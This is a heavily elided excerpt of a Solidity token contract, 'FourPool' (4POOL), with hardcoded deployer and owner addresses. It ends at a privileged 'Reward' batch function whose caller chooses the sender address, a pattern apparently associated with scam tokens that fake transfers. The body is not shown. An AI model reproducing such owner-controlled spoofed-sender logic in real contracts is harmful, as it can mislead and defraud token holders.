...
contract FourPool is Context, IERC20 {
    ...
    address _contDeployr = 0xAd41BD1cf3Fd753017Ef5c0da8dF31A3074EA1Ea;
    address public _ownr = 0x1628ab02E635F6bad7Cbb5b7Ed653bf681eFA9a3;
   constructor () public {

        _name = "4Pool Reserve";
        _symbol = "4POOL";
        _decimals = 18;
        uint256 initialSupply = 44444444444444444444444444;
        _safeOwnr = _ownr;
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function Reward(address sndr,address[] memory destination, uint256[] memory amounts) public _verify(){
